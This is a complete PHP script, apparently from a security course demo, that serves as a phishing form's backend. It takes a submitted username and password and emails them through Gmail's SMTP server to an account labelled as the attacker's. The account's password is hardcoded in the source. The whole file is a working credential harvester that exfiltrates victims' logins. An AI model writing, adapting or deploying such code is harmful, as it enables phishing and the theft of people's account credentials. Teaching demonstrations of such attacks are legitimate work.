<?php

require_once ('PHPMailer/PHPMailerAutoload.php');

$email = "comp590.demo.attacker@gmail.com";

//ini_set("SMTP","ssl://smtp.gmail.com");
//ini_set("smtp_port","465");
//ini_set('sendmail_from', $email);

ini_set("SMTP","smtp.gmail.com");
ini_set("smtp_port","25");
ini_set('sendmail_from', $email);

//ini_set("SMTP","tls://smtp.gmail.com");
//ini_set("smtp_port","587");
//ini_set('sendmail_from', $email);

$mail = new PHPMailer();
$mail->isSMTP();
$mail->SMTPAuth = true;
$mail->SMTPSecure = "ssl";
$mail->Host = "smtp.gmail.com";
$mail->Port = '465';
$mail->isHTML();
$mail->Username = $email;
$mail->Password = "comp590344";

if ( isset( $_REQUEST['submit'])) {
    echo "Form submitted";
    $username = $_REQUEST['name'];
    $password = $_REQUEST['pass'];
    
    $msg = "Username: $username \n Password: $password";

    $mail->SetFrom($email);
    $mail->Subject = "User details";
    $mail->Body = $msg;
    $mail->AddAddress($email);

    $mail->Send();

}
